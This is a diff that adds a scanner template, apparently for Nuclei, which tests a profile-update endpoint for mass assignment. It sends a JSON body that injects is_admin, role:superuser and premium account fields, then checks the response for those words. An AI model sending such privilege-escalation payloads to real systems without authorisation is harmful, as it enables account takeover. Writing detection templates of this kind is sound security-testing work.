@@ -1,0 +1,33 @@
+id: custom-mass-assignment-admin
+
+info:
+  name: Mass Assignment - Admin Privilege Escalation
+  author: sturmer-creative-agent
+  severity: high
+  description: Tests for mass assignment by injecting admin/role fields into update endpoints.
+  tags: mass-assignment,privilege-escalation,business-logic
+
+http:
+  - raw:
+      - |
+        POST /api/v1/user/profile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"email":"test@test.com","is_admin":true,"role":"superuser","account_type":"premium"}
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - '"is_admin":true'
+          - '"role":"superuser"'
+          - '"account_type":"premium"'
+        condition: or
+      - type: word
+        words:
+          - "admin"
+          - "superuser"
+          - "privilege"
+        part: body
+        condition: or
